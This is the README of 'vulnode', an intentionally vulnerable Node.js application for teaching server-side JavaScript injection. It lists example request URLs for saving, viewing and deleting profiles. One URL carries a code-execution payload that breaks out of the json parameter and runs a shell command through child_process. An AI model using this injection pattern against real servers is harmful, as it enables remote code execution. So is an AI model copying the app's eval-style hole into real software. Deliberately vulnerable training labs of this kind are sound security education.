vulnode
=======

Vulnode is a Node.js application vulnerable to server-side javascript injection. This is for education purposes only.<br /><br />
<ul>
<li>Save a profile: <code>http://localhost:9091/?action=save&name=nishant&json={"name":"Nishant","age":"25","gender":"Male","location":"Bangalore","interests":"Piano"}</code></li><br />
<li>View a profile: <code>http://localhost:9091/?action=view&name=nishant</code></li><br />
<li>Delete a profile: <code>http://localhost:9091/?action=delete&name=nishant</code></li><br />
<li>Code Execution: <code>http://localhost:9091/?json='test');var sys=require('sys');var exec=require('child_process').exec;function puts(error,stdout,stderr){sys.puts(stdout)};exec("ls -lah",puts);</code></li><br />
</ul>
